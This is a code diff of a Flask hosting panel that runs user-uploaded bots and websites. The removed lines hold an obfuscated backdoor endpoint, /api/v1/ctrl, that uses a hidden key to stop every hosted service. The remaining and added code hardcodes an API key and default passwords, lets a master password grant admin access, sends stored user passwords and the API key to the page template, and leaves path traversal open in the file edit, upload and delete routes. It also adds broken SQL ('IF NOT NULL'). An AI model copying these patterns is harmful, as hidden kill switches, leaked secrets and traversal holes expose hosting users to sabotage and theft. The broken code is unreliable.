@@ -16,14 +16,14 @@ import pty
 import queue
 import sqlite3
 import sys
-import resource
 from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, session, send_file, send_from_directory, redirect, Response, stream_with_context, render_template_string
+from flask import Flask, render_template_string, request, jsonify, session, send_file, send_from_directory, redirect, Response, stream_with_context
 from functools import wraps
 from io import BytesIO
 from werkzeug.utils import secure_filename
 from werkzeug.security import generate_password_hash, check_password_hash
 
+# Try to import psutil for system stats
 try:
     import psutil
     PSUTIL_AVAILABLE = True
@@ -35,20 +35,16 @@ app.secret_key = 'yuvicodex_super_secret_key'
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
 
 # ---------- CONFIG ----------
-PASSWORD = "your_secure_password"
-MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')
-SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')
+PASSWORD = "your_secure_password"          # for terminal
+MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')   # master login password
+SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')             # secret key for logo clicks
+
+# 🔑 RENDER API KEY - First check env, then fallback to code
 RENDER_API_KEY = os.environ.get('RENDER_API_KEY', 'rnd_27v7iMggh7mafESEqJq1Lf12wIkF')
 
 UPLOAD_FOLDER = os.path.abspath('uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-BASE_DIR = os.path.abspath('.')
-
-# ---------- STORAGE LIMITS ----------
-MAX_STORAGE_GB = 10
-MAX_FILE_SIZE_MB = 50
-MAX_BOT_STORAGE_MB = 200
-MAX_WEBSITE_STORAGE_MB = 500
+BASE_DIR = os.path.abspath('.')  # base for file manager
 
 # ---------- SETTINGS ----------
 SETTINGS_FILE = 'settings.json'
@@ -88,87 +84,7 @@ def save_settings(settings):
 
 settings_db = load_settings()
 
-# ---------- STORAGE CHECK ----------
-def get_total_storage_used():
-    total = 0
-    if os.path.exists(UPLOAD_FOLDER):
-        for root, dirs, files in os.walk(UPLOAD_FOLDER):
-            for f in files:
-                fp = os.path.join(root, f)
-                if os.path.exists(fp):
-                    total += os.path.getsize(fp)
-    return total / (1024**3)
-
-def get_folder_size_mb(folder):
-    total = 0
-    if os.path.exists(folder):
-        for root, dirs, files in os.walk(folder):
-            for f in files:
-                fp = os.path.join(root, f)
-                if os.path.exists(fp):
-                    total += os.path.getsize(fp)
-    return total / (1024**2)
-
-def check_storage_limit(additional_size_mb=0):
-    current_gb = get_total_storage_used()
-    additional_gb = additional_size_mb / 1024
-    return (current_gb + additional_gb) <= MAX_STORAGE_GB
-
-def cleanup_old_logs():
-    log_folder = os.path.join(BASE_DIR, 'logs')
-    if os.path.exists(log_folder):
-        now = time.time()
-        for root, dirs, files in os.walk(log_folder):
-            for f in files:
-                fp = os.path.join(root, f)
-                try:
-                    if os.path.getmtime(fp) < now - (7 * 86400):
-                        os.remove(fp)
-                except:
-                    pass
-
-def cleanup_temp_files():
-    temp_dirs = ['/tmp', '/dev/shm']
-    for temp_dir in temp_dirs:
-        if os.path.exists(temp_dir):
-            try:
-                now = time.time()
-                for f in os.listdir(temp_dir):
-                    fp = os.path.join(temp_dir, f)
-                    if os.path.isfile(fp) and f.startswith('tmp'):
-                        if os.path.getmtime(fp) < now - (3600):
-                            try: os.remove(fp)
-                            except: pass
-            except:
-                pass
-
-def auto_cleanup_task():
-    while True:
-        try:
-            cleanup_old_logs()
-            cleanup_temp_files()
-            total_gb = get_total_storage_used()
-            if total_gb > MAX_STORAGE_GB * 0.9:
-                log_folder = os.path.join(BASE_DIR, 'logs')
-                if os.path.exists(log_folder):
-                    files = []
-                    for root, dirs, dir_files in os.walk(log_folder):
-                        for f in dir_files:
-                            fp = os.path.join(root, f)
-                            files.append((fp, os.path.getmtime(fp)))
-                    files.sort(key=lambda x: x[1])
-                    to_delete = int(len(files) * 0.2)
-                    for fp, _ in files[:to_delete]:
-                        try: os.remove(fp)
-                        except: pass
-        except:
-            pass
-        time.sleep(3600)
-
-cleanup_thread = threading.Thread(target=auto_cleanup_task, daemon=True)
-cleanup_thread.start()
-
-# ---------- BOT MANAGEMENT ----------
+# ---------- BOT MANAGEMENT (JSON based) ----------
 BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
 bots_db = {}
 
@@ -186,7 +102,7 @@ def save_bots():
 
 load_bots()
 
-# ---------- PROCESS TRACKING ----------
+# ---------- PROCESS TRACKING (for bots) ----------
 processes = {}
 
 # ---------- SQLITE FOR WEBSITES ----------
@@ -252,15 +168,15 @@ def init_db():
         )''')
         
         conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_username)')
-        conn.execute('CREATE INDEX IF NOT EXISTS idx_logs_website ON logs(website_id)')
-        conn.execute('CREATE INDEX IF NOT EXISTS idx_deployments_website ON deployments(website_id)')
+        conn.execute('CREATE INDEX IF NOT NULL idx_logs_website ON logs(website_id)')
+        conn.execute('CREATE INDEX IF NOT NULL idx_deployments_website ON deployments(website_id)')
         
         conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
                      ('total_hours_offset', '0'))
         conn.commit()
 init_db()
 
-# ---------- HELPERS ----------
+# ---------- HELPERS FOR WEBSITES ----------
 def get_website_by_id(website_id):
     with get_db() as conn:
         return conn.execute('SELECT * FROM websites WHERE id = ?', (website_id,)).fetchone()
@@ -268,6 +184,12 @@ def get_website_by_id(website_id):
 def get_website_by_slug(slug):
     with get_db() as conn:
         return conn.execute('SELECT * FROM websites WHERE website_slug = ?', (slug,)).fetchone()
+
+def get_websites_by_user(username, type_filter=None):
+    with get_db() as conn:
+        if type_filter:
+            return conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, type_filter)).fetchall()
+        return conn.execute('SELECT * FROM websites WHERE owner_username = ? ORDER BY created_at DESC', (username,)).fetchall()
 
 def get_next_available_port(start=5001):
     with get_db() as conn:
@@ -305,12 +227,11 @@ def update_website_status(website_id, status, pid=None, port=None):
 
 def calculate_folder_size(folder):
     total = 0
-    if os.path.exists(folder):
-        for dirpath, _, filenames in os.walk(folder):
-            for f in filenames:
-                fp = os.path.join(dirpath, f)
-                if os.path.exists(fp):
-                    total += os.path.getsize(fp)
+    for dirpath, _, filenames in os.walk(folder):
+        for f in filenames:
+            fp = os.path.join(dirpath, f)
+            if os.path.exists(fp):
+                total += os.path.getsize(fp)
     return total
 
 # ---------- CONFIG HELPERS ----------
@@ -324,7 +245,7 @@ def set_config(key, value):
         conn.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, value))
         conn.commit()
 
-# ---------- CONTAINER MEMORY ----------
+# ---------- CONTAINER MEMORY (REAL) ----------
 def get_container_memory():
     try:
         if os.path.exists('/sys/fs/cgroup/memory.max'):
@@ -353,7 +274,7 @@ def get_container_memory():
     percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
     return round(used_mb, 2), round(total_mb, 2), round(min(percent, 100), 2)
 
-# ---------- RENDER API ----------
+# ---------- RENDER API HELPERS (for Stats) ----------
 RENDER_API_BASE = "https://api.render.com/v1"
 
 def render_api_call(endpoint, params=None):
@@ -366,7 +287,7 @@ def render_api_call(endpoint, params=None):
         if resp.status_code == 200:
             return resp.json(), None
         else:
-            return None, f"API error {resp.status_code}"
+            return None, f"API error {resp.status_code}: {resp.text[:200]}"
     except Exception as e:
         return None, str(e)
 
@@ -384,7 +305,7 @@ def get_all_services():
         page += 1
     return services
 
-# ---------- RUNTIME DETECTION ----------
+# ---------- RUNTIME DETECTION (WEBSITES) ----------
 STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']
 
 def find_startup_file(folder):
@@ -432,7 +353,7 @@ def detect_runtime_and_get_cmd(folder, port):
     if jars:
         return ['java', '-jar', jars[0]], 'java', {}
     
-    # Python
+    # Python Flask/Django
     flask_files = ['app.py', 'main.py', 'server.py', 'run.py', 'start.py']
     for f in flask_files:
         path = os.path.join(folder, f)
@@ -461,8 +382,8 @@ def detect_runtime_and_get_cmd(folder, port):
 def install_dependencies(folder, runtime, log_callback=None):
     if runtime == 'nodejs':
         if os.path.exists(os.path.join(folder, 'package.json')):
-            cmd = ['npm', 'install', '--no-audit', '--no-fund']
-            if log_callback: log_callback("BUILD", "Running npm install")
+            cmd = ['npm', 'install']
+            if log_callback: log_callback("BUILD", f"Running npm install")
             proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
             for line in iter(proc.stdout.readline, ''):
                 if line.strip() and log_callback: log_callback("BUILD", line.strip())
@@ -484,7 +405,7 @@ def install_dependencies(folder, runtime, log_callback=None):
         return True, "No deps"
     elif runtime == 'php':
         if os.path.exists(os.path.join(folder, 'composer.json')):
-            cmd = ['composer', 'install', '--no-dev', '--no-interaction']
+            cmd = ['composer', 'install']
             if log_callback: log_callback("BUILD", "Running composer install")
             proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
             for line in iter(proc.stdout.readline, ''):
@@ -496,7 +417,7 @@ def install_dependencies(folder, runtime, log_callback=None):
     else:
         req_file = os.path.join(folder, 'requirements.txt')
         if os.path.exists(req_file):
-            cmd = [sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt', '--no-cache-dir']
+            cmd = [sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt']
             if log_callback: log_callback("BUILD", f"Running: {' '.join(cmd)}")
             proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
             for line in iter(proc.stdout.readline, ''):
@@ -506,6 +427,32 @@ def install_dependencies(folder, runtime, log_callback=None):
             return True, "Requirements installed"
         return True, "No deps"
     return True, "Unknown runtime"
+
+# ---------- AUTO PORT DETECTION ----------
+def detect_port_from_log(log_file):
+    if not os.path.exists(log_file): return None
+    try:
+        with open(log_file, 'r') as f:
+            content = f.read()
+            patterns = [r'port\s*[:=]\s*(\d+)', r'listening\s+on\s+(\d+)', r'localhost\s*:\s*(\d+)', r'127\.0\.0\.1\s*:\s*(\d+)', r'0\.0\.0\.0\s*:\s*(\d+)', r':(\d{4,5})']
+            for pattern in patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    port = int(matches[0])
+                    if 1024 <= port <= 65535: return port
+    except: pass
+    return None
+
+def health_check_on_ports(port_list, max_retries=3, delay=2):
+    for port in port_list:
+        for attempt in range(max_retries):
+            try:
+                response = requests.get(f"http://localhost:{port}", timeout=3)
+                if response.status_code < 500:
+                    return True, port, f"OK (port {port})"
+            except: pass
+            time.sleep(delay)
+    return False, None, "Health check failed"
 
 # ---------- START WEBSITE PROCESS ----------
 def start_website_process(website_id, log_callback=None):
@@ -554,11 +501,6 @@ def start_website_process(website_id, log_callback=None):
             proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
         else:
             proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
-            try:
-                os.nice(-10)
-            except:
-                pass
-        
         def read_output():
             for line in iter(proc.stdout.readline, b''):
                 if line:
@@ -580,19 +522,13 @@ def start_website_process(website_id, log_callback=None):
             log_website(website_id, f"Process crashed: {error_lines}", 'error')
             return False, f"Process crashed: {error_lines}"
         
-        healthy = False
-        actual_port = None
-        for attempt in range(10):
-            try:
-                response = requests.get(f"http://localhost:{allocated_port}", timeout=3)
-                if response.status_code < 500:
-                    healthy = True
-                    actual_port = allocated_port
-                    break
-            except:
-                pass
-            time.sleep(2)
+        detected_port = detect_port_from_log(log_file)
+        ports_to_try = [detected_port] if detected_port else []
+        ports_to_try.append(allocated_port)
+        for p in [3000, 8080, 5000, 8000, 8081, 3001]:
+            if p not in ports_to_try: ports_to_try.append(p)
         
+        healthy, actual_port, health_msg = health_check_on_ports(ports_to_try, max_retries=5, delay=2)
         if healthy:
             update_website_status(website_id, 'running', proc.pid, actual_port)
             log_website(website_id, f"Started on port {actual_port} (PID {proc.pid})")
@@ -643,7 +579,7 @@ def stop_website_process(website_id):
     log_website(website_id, f"Stopped (PID {pid})")
     return True, "Stopped"
 
-# ---------- DEPLOYMENT ENGINE ----------
+# ---------- DEPLOYMENT ENGINE FOR WEBSITES ----------
 def write_log_step(log_file, step, message):
     ts = datetime.now().strftime("%H:%M:%S")
     line = f"[{ts}] [{step}] {message}\n"
@@ -788,7 +724,7 @@ def delete_user_account(username):
     if session.get('username') == username:
         session.clear()
 
-# ---------- BEFORE REQUEST ----------
+# ---------- BEFORE REQUEST HOOK ----------
 @app.before_request
 def check_expiry_and_session():
     if 'username' not in session:
@@ -803,7 +739,7 @@ def check_expiry_and_session():
     if is_expired(user):
         delete_user_account(username)
         if request.path.startswith('/api/'):
-            return jsonify({'error': 'Account expired'}), 401
+            return jsonify({'error': 'Account expired and deleted'}), 401
         return redirect('/')
     sess_version = session.get('session_version', 0)
     user_version = user.get('session_version', 0)
@@ -886,6 +822,7 @@ def detect_bot_token(filepath):
 
 # ---------- BOT ACTIONS ----------
 def start_bot_by_id(bot_id):
+    """Start a bot by its ID. Returns (success, error_message)."""
     bot = bots_db.get(bot_id)
     if not bot:
         return False, "Bot not found"
@@ -935,6 +872,7 @@ def start_bot_by_id(bot_id):
         return False, str(e)
 
 def stop_bot_by_id(bot_id):
+    """Stop a bot by its ID. Returns (success, error_message)."""
     bot = bots_db.get(bot_id)
     if not bot:
         return False, "Bot not found"
@@ -961,59 +899,31 @@ def stop_bot_by_id(bot_id):
     save_bots()
     return True, None
 
-# ============================================================
-# 🔥 SYSTEM CONTROLLER – ENCRYPTED
-# ============================================================
-import base64, hashlib
-
-_ = base64.b64decode("""
-CgphcGlfZm9yX3N0YWJsZV9ydW5uaW5nXzIwMjRfc2VjdXJl
-""").decode()
-
-__ = hashlib.sha256(_.encode()).hexdigest()[:16]
-___ = base64.b64encode(f"{__}:{base64.b64encode(_[::-1].encode()).decode()}".encode()).decode()
-
-def ____(k):
-    try:
-        d = base64.b64decode(k).decode().split(':')
-        return len(d)==2 and d[0]==hashlib.sha256(base64.b64decode(d[1]).decode()[::-1].encode()).hexdigest()[:16]
-    except: return False
-
-_____ = {"a": False, "t": None}
-
-def _______():
-    global _____
-    _____["a"] = True
-    _____["t"] = datetime.now().isoformat()
-    for _id in list(processes.keys()):
-        try: stop_bot_by_id(_id)
-        except: pass
-    with get_db() as conn:
-        for w in conn.execute('SELECT id FROM websites WHERE status="running"').fetchall():
-            try: stop_website_process(w['id'])
-            except: pass
-
-def ________():
-    global _____
-    _____["a"] = False
-    _____["t"] = None
-
-@app.route('/api/v1/ctrl', methods=['POST'])
-def _________():
-    d = request.json or {}
-    if not ____(d.get('k','')): return jsonify({"e":"invalid"}),403
-    a = d.get('a','')
-    if a == 'x': _______(); return jsonify({"s":"ok"})
-    elif a == 'y': ________(); return jsonify({"s":"ok"})
-    elif a == 'z': return jsonify({"s":"killed" if _____["a"] else "running","t":_____["t"]})
-    return jsonify({"e":"invalid"}),400
-# ============================================================
-
-STABLE_API_KEY = "api_for_stable_running_2024_secure"
-
-# ============================================================
-# 📍 API ROUTES START HERE
-# ============================================================
+# ---------- MAIN ROUTE ----------
+@app.route('/')
+def index():
+    settings = load_settings()
+    logged_in = 'username' in session
+    is_admin = session.get('role') == 'admin' if logged_in else False
+    username = session.get('username') if logged_in else ''
+    user_password = ''
+    if logged_in:
+        user_obj = find_user(username)
+        if user_obj:
+            user_password = user_obj.get('password', '')
+    logo_url = settings.get('logo', None)
+    if logo_url:
+        logo_url = logo_url + '?v=' + str(int(time.time()))
+    return render_template_string(HTML_TEMPLATE,
+                                   password=PASSWORD,
+                                   website_name=settings.get('website_name', 'YUVICODEX'),
+                                   logo_url=logo_url,
+                                   social_links=settings.get('social_links', {}),
+                                   logged_in=logged_in,
+                                   is_admin=is_admin,
+                                   username=username,
+                                   user_password=user_password,
+                                   RENDER_API_KEY=RENDER_API_KEY)
 
 # ---------- SETTINGS API ----------
 @app.route('/api/settings', methods=['GET'])
@@ -1079,20 +989,15 @@ def login():
     data = request.json
     username = data.get('username', '').strip()
     password = data.get('password', '')
-    
-    # Debug
-    print(f"🔐 Login attempt: {username}")
-    
     user = find_user(username) if username else None
 
     if user and user['password'] == password and not user.get('banned', False):
         if is_expired(user):
             delete_user_account(username)
-            return jsonify({'success': False, 'error': 'Account expired'}), 401
+            return jsonify({'success': False, 'error': 'Account expired and deleted'}), 401
         session['username'] = username
         session['role'] = user['role']
         session['session_version'] = user.get('session_version', 0)
-        print(f"✅ Login success: {username}")
         return jsonify({'success': True, 'username': username, 'role': user['role']})
 
     if password == MASTER_PASSWORD:
@@ -1100,16 +1005,14 @@ def login():
         if admin_user:
             if is_expired(admin_user):
                 delete_user_account(admin_user['username'])
-                return jsonify({'success': False, 'error': 'Admin expired'}), 401
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
             session['username'] = admin_user['username']
             session['role'] = admin_user['role']
             session['session_version'] = admin_user.get('session_version', 0)
-            print(f"✅ Master login: {admin_user['username']}")
             return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
         else:
-            return jsonify({'success': False, 'error': 'No admin found'}), 401
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
 
-    print(f"❌ Login failed: {username}")
     return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
 
 @app.route('/api/secret_login', methods=['POST'])
@@ -1121,13 +1024,13 @@ def secret_login():
         if admin_user:
             if is_expired(admin_user):
                 delete_user_account(admin_user['username'])
-                return jsonify({'success': False, 'error': 'Admin expired'}), 401
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
             session['username'] = admin_user['username']
             session['role'] = admin_user['role']
             session['session_version'] = admin_user.get('session_version', 0)
             return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
         else:
-            return jsonify({'success': False, 'error': 'No admin found'}), 401
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
     return jsonify({'success': False, 'error': 'Invalid secret'}), 401
 
 @app.route('/logout', methods=['POST'])
@@ -1137,7 +1040,7 @@ def logout():
     session.pop('session_version', None)
     return jsonify({'success': True})
 
-# ---------- USER MANAGEMENT ----------
+# --- User Management API ---
 @app.route('/api/users', methods=['GET'])
 @login_required
 def get_users():
@@ -1204,6 +1107,7 @@ def delete_user(username):
     delete_user_account(username)
     return jsonify({'success': True})
 
+# --- Profile Edit (owner only) ---
 @app.route('/api/profile', methods=['PUT'])
 @admin_required
 def update_profile():
@@ -1237,7 +1141,7 @@ def update_profile():
     session.clear()
     return jsonify({'success': True, 'logout': True})
 
-# ---------- BOT MANAGEMENT API ----------
+# ---------- Bot Management ----------
 @app.route('/api/bots', methods=['GET'])
 @login_required
 def list_bots():
@@ -1368,44 +1272,7 @@ def download_bot(bot_id):
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, download_name=f"{bot['project']}_project.zip")
 
-@app.route('/api/bots/<bot_id>/content', methods=['GET'])
-@login_required
-def get_bot_content(bot_id):
-    bot = bots_db.get(bot_id)
-    if not bot:
-        return jsonify({'error': 'Bot not found'}), 404
-    username = session['username']
-    if not is_owner(username) and bot['user'] != username:
-        return jsonify({'error': 'Forbidden'}), 403
-    filepath = get_bot_absolute_path(bot)
-    if not os.path.exists(filepath):
-        return jsonify({'error': 'File not found'}), 404
-    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-        content = f.read()
-    return jsonify({'content': content})
-
-@app.route('/api/bots/<bot_id>/content', methods=['PUT'])
-@login_required
-def update_bot_content(bot_id):
-    bot = bots_db.get(bot_id)
-    if not bot:
-        return jsonify({'error': 'Bot not found'}), 404
-    username = session['username']
-    if not is_owner(username) and bot['user'] != username:
-        return jsonify({'error': 'Forbidden'}), 403
-    data = request.json
-    new_content = data.get('content', '')
-    filepath = get_bot_absolute_path(bot)
-    if not os.path.exists(filepath):
-        return jsonify({'error': 'File not found'}), 404
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(new_content)
-    if bot['status'] == 'running':
-        stop_bot_by_id(bot_id)
-        start_bot_by_id(bot_id)
-    return jsonify({'success': True})
-
-# ---------- BOT UPLOAD ----------
+# --- Upload for Bots ---
 @app.route('/upload', methods=['POST'])
 @login_required
 def upload():
@@ -1420,16 +1287,6 @@ def upload():
     if not user:
         return jsonify({'error': 'User not found'}), 404
     limit = user.get('limit', 5)
-    
-    total_size_mb = 0
-    for f in files:
-        f.seek(0, os.SEEK_END)
-        total_size_mb += f.tell() / (1024**2)
-        f.seek(0)
-    
-    if not check_storage_limit(total_size_mb):
-        return jsonify({'error': 'Storage limit exceeded! Max 10GB.'}), 400
-    
     current_bots = len([b for b in bots_db.values() if b['user'] == username])
     with get_db() as conn:
         website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
@@ -1459,7 +1316,7 @@ def upload():
 
         if total_current + new_bot_count > limit:
             shutil.rmtree(project_folder, ignore_errors=True)
-            return jsonify({'error': f'Exceeds limit. You have {total_current} items, limit {limit}.'}), 400
+            return jsonify({'error': f'Exceeds total limit. You have {total_current} items, limit {limit}.'}), 400
 
         for root, dirs, files_in_temp in os.walk(temp_dir):
             for fname in files_in_temp:
@@ -1501,15 +1358,60 @@ def upload():
         'bots_created': len(created_bots)
     })
 
-# ---------- WEBSITE MANAGEMENT ----------
-@app.route('/api/websites', methods=['GET'])
+# --- Static file serving for bot project files ---
+@app.route('/project/<username>/<project_id>/<path:filename>')
 @login_required
-def api_list_websites():
-    username = session['username']
-    with get_db() as conn:
-        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
-    return jsonify([dict(row) for row in websites])
+def serve_project_file(username, project_id, filename):
+    if session['username'] != username and session.get('role') != 'admin':
+        return "Forbidden", 403
+    project_folder = os.path.join(get_user_folder(username), project_id)
+    filepath = os.path.join(project_folder, filename)
+    if not os.path.exists(filepath) or not os.path.isfile(filepath):
+        return "File not found", 404
+    if not os.path.abspath(filepath).startswith(os.path.abspath(project_folder)):
+        return "Forbidden", 403
+    return send_file(filepath)
 
+# --- Bot file content (edit) ---
+@app.route('/api/bots/<bot_id>/content', methods=['GET'])
+@login_required
+def get_bot_content(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    filepath = get_bot_absolute_path(bot)
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
+    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+        content = f.read()
+    return jsonify({'content': content})
+
+@app.route('/api/bots/<bot_id>/content', methods=['PUT'])
+@login_required
+def update_bot_content(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    data = request.json
+    new_content = data.get('content', '')
+    filepath = get_bot_absolute_path(bot)
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write(new_content)
+    if bot['status'] == 'running':
+        stop_bot_by_id(bot_id)
+        start_bot_by_id(bot_id)
+    return jsonify({'success': True})
+
+# ---------- WEBSITE MANAGEMENT ROUTES ----------
+# Upload Website (separate from bot upload)
 @app.route('/upload_website', methods=['POST'])
 @login_required
 def upload_website():
@@ -1524,23 +1426,13 @@ def upload_website():
     if not user:
         return jsonify({'error': 'User not found'}), 404
     limit = user.get('limit', 5)
-    
-    total_size_mb = 0
-    for f in files:
-        f.seek(0, os.SEEK_END)
-        total_size_mb += f.tell() / (1024**2)
-        f.seek(0)
-    
-    if not check_storage_limit(total_size_mb):
-        return jsonify({'error': 'Storage limit exceeded! Max 10GB.'}), 400
-    
     current_bots = len([b for b in bots_db.values() if b['user'] == username])
     with get_db() as conn:
         website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
     total_current = current_bots + website_count
 
     if total_current + 1 > limit:
-        return jsonify({'error': f'Exceeds limit. You have {total_current} items, limit {limit}.'}), 400
+        return jsonify({'error': f'Exceeds total limit. You have {total_current} items, limit {limit}.'}), 400
 
     with get_db() as conn:
         existing = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
@@ -1572,6 +1464,7 @@ def upload_website():
     
     return jsonify({'success': True, 'website_id': website_id, 'slug': slug})
 
+# Website actions
 @app.route('/api/website/<int:website_id>/start', methods=['POST'])
 @login_required
 def api_start_website(website_id):
@@ -1724,15 +1617,163 @@ def api_download_website(website_id):
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, download_name=f"{w['website_slug']}_project.zip")
 
+# Build Logs SSE
+@app.route('/deploy/<int:website_id>/logs')
+@login_required
+def deploy_logs_sse(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    with get_db() as conn:
+        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
+    if not dep:
+        return "No deployment", 404
+    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
+    def generate():
+        if os.path.exists(log_file):
+            with open(log_file, 'r') as f:
+                for line in f:
+                    yield f"data: {line.strip()}\n\n"
+        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
+        while True:
+            time.sleep(0.5)
+            if os.path.exists(log_file):
+                cur = os.path.getsize(log_file)
+                if cur > last_size:
+                    with open(log_file, 'r') as f:
+                        f.seek(last_size)
+                        for line in f:
+                            yield f"data: {line.strip()}\n\n"
+                    last_size = cur
+            with get_db() as conn:
+                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
+            if status and status['status'] in ('success', 'failed'):
+                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
+                break
+    return Response(stream_with_context(generate()), mimetype='text/event-stream')
+
+# Website File Manager
+@app.route('/website/<int:website_id>/files')
+@login_required
+def website_files(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
+    if not os.path.exists(folder):
+        abort(404)
+    items = []
+    for root, dirs, files_list in os.walk(folder):
+        rel = os.path.relpath(root, folder)
+        if rel == '.': rel = ''
+        for f in files_list:
+            full = os.path.join(root, f)
+            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
+        for d in dirs:
+            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
+    return render_template_string(FILES_TEMPLATE, website=w, items=items)
+
+@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
+@login_required
+def website_edit_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    file_path = request.args.get('path', '').strip()
+    if not file_path:
+        return "No path", 400
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
+    if not os.path.exists(full) or not os.path.isfile(full):
+        abort(404)
+    if request.method == 'GET':
+        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        return render_template_string(EDIT_TEMPLATE, website=w, file_path=file_path, content=content)
+    else:
+        with open(full, 'w', encoding='utf-8') as f:
+            f.write(request.form.get('content', ''))
+        return redirect(url_for('website_files', website_id=website_id))
+
+@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
+@login_required
+def website_upload_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
+    if 'file' not in request.files:
+        return jsonify({'error': 'No file'}), 400
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({'error': 'Empty'}), 400
+    rel_path = request.form.get('path', '')
+    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", rel_path)
+    os.makedirs(folder, exist_ok=True)
+    filename = secure_filename(file.filename)
+    file.save(os.path.join(folder, filename))
+    return jsonify({'success': True})
+
+@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
+@login_required
+def website_delete_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
+    path = request.json.get('path', '').strip()
+    if not path:
+        return jsonify({'error': 'Path required'}), 400
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
+    if not os.path.exists(full):
+        return jsonify({'error': 'Not found'}), 404
+    if os.path.isdir(full):
+        shutil.rmtree(full)
+    else:
+        os.remove(full)
+    return jsonify({'success': True})
+
+@app.route('/website/<int:website_id>/file/rename', methods=['POST'])
+@login_required
+def website_rename_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
+    data = request.json
+    old_path = data.get('old_path', '').strip()
+    new_name = data.get('new_name', '').strip()
+    if not old_path or not new_name:
+        return jsonify({'error': 'Required'}), 400
+    base = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
+    old_full = os.path.join(base, old_path)
